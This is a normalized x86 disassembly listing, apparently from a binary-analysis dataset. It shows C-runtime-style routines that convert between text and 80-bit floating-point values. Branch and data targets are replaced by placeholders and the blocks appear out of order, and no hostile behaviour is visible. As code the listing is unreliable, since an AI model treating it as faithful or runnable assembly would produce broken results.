call sub_41ac09
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_42b114
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_41ac09
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_42b7c0 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_42c8f1
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_42b7f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_41e063
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41ef83
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_41e063
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
